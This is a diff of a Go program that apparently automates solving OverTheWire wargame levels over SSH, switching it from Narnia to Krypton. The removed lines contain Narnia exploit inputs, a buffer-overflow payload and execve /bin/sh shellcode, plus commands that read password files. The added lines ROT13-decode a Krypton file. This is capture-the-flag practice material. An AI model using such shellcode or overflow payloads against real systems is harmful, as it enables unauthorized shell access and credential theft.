@@ -1,4 +1,4 @@
-package main // import "vimagination.zapto.org/overthewire/narnia"
+package main // import "vimagination.zapto.org/overthewire/krypton"
 
 import (
 	"bytes"
@@ -14,23 +14,20 @@ import (
 )
 
 const (
-	host     = "narnia.labs.overthewire.org:2226"
-	username = "narnia%d"
+	host     = "krypton.labs.overthewire.org:2222"
+	username = "krypton%d"
 )
 
 var (
 	commands = [...][]string{
 		//level 0
-		[]string{
-			"/narnia/narnia0;exit\n",
-			"00000000000000000000" + string([]byte{0xef, 0xbe, 0xad, 0xde}) + "\n",
-			"echo -n \"Password:\";cat /etc/narnia_pass/narnia1;exit\n",
-		},
+		[]string{},
 		//level 1
 		[]string{
-			"EGG=\"$(printf \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\")\" /narnia/narnia1;exit\n", // Shell Code from http://shell-storm.org/shellcode/files/shellcode-811.php
-			"echo -n \"Password:\";cat /etc/narnia_pass/narnia2;exit\n",
+			"echo -n \"Password:\";cat /krypton/krypton1/krypton2 | tr \"[N-ZA-M]\" \"[A-Z]\" | cut -d' ' -f4;exit\n",
 		},
+		//level 2
+
 	}
 	passwordBytes = []byte("Password:")
 	sValueBytes   = []byte("SVALUE:")
@@ -43,8 +40,8 @@ func main() {
 		password string
 	)
 
-	flag.UintVar(&level, "l", 0, "level number. > 0 requires password")
-	flag.StringVar(&password, "p", "narnia0", "password for initial level")
+	flag.UintVar(&level, "l", 1, "level number. > 1 requires password")
+	flag.StringVar(&password, "p", "KRYPTONISGREAT", "password for initial level")
 	flag.Parse()
 
 	stdout := make(memio.Buffer, 0, 41)
